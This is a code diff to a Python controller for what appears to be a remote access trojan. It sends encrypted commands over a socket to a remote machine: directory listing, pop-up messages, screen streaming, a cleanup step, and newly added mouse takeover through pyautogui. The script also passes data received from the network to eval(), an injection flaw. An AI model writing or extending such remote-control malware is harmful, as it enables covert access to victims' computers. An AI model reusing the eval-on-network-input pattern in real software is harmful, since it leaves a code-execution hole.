@@ -2,7 +2,7 @@ from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.primitives import hashes
-import socket, vidstream, pyautogui
+import socket, vidstream, pyautogui, os
 
 class color:
     BLACK = "\u001b[30m"
@@ -59,12 +59,12 @@ def decrypt(message: bytes, encode='utf8'):
 
 client_socket, server_socket, privateKey, remoteKey = connSetup()   # Start Connection
 
-change = 0
+change = 1
 path = ""
 # Main Code
 while True:
     try: 
-        if change == 0:
+        if change == 1:
             path = client_socket.recv(8192)
             path = decrypt(path)
         data = input(f"{color.BLUE}{path} >{color.WHITE} ")
@@ -78,6 +78,10 @@ while True:
             response = eval(response)
             for i in range(0, len(response)): print(response[i])
 
+        elif command == "clear":
+            os.system('cls' if os.name=='nt' else 'clear')
+            change = 0
+
         elif command == "pwd":
             client_socket.send(crypt("pwd".encode()))
             response = client_socket.recv(8192)
@@ -86,6 +90,7 @@ while True:
 
         elif command == "cd":
             client_socket.send(crypt(str(data).encode()))
+            change = 1
 
         elif command == "messagebox":
             client_socket.send(crypt(str(data).encode()))
@@ -140,6 +145,19 @@ while True:
             print("Cleaning....")
             client_socket.send(crypt("sleep".encode()))
             break
+
+        elif command == "mouse":
+            if len(data) <= 5:
+                data.append("False")
+                data.append(0)
+            elif len(data) <= 6:
+                data.append(0)
+            print(data)
+            client_socket.send(crypt(str(data).encode()))
+            # ['mouse', 'move', 'X', 'Y', 'absolute', 'duration']
+        
+        else:
+            print("Command Not Found!!")
 
     except ConnectionResetError:
         server_socket.close()
